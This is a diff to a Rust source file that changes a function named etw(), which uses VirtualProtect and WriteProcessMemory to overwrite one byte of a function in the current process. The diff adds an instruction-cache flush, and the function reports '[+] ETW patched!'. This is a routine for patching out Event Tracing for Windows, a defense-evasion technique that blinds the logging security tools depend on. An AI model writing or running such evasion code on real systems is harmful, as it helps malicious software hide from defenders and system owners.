@@ -1,5 +1,5 @@
 use std::os::raw::c_void;
-use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+use windows::Win32::System::Diagnostics::Debug::{FlushInstructionCache, WriteProcessMemory};
 use windows::Win32::System::LibraryLoader::GetModuleHandleA;
 use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE};
 use windows::Win32::System::Threading::GetCurrentProcess;
@@ -19,7 +19,8 @@ fn etw() {
             1,
             PAGE_READWRITE,
             &mut old_permissions,
-        ).is_err()
+        )
+        .is_err()
         {
             panic!("[-] Failed to change protection.");
         }
@@ -29,7 +30,8 @@ fn etw() {
             patch.as_ptr().cast(),
             1,
             None,
-        ).is_err()
+        )
+        .is_err()
         {
             panic!("[-] Failed to overwrite function.");
         }
@@ -39,9 +41,13 @@ fn etw() {
             1,
             old_permissions,
             &mut old_permissions,
-        ).is_err()
+        )
+        .is_err()
         {
             panic!("[-] Failed to restore permissions.");
+        }
+        if FlushInstructionCache(GetCurrentProcess(), Some(etw_addr as *mut c_void), 1).is_err() {
+            panic!("[-] Failed to flush cache instruction.");
         }
         println!("[+] ETW patched!");
     }
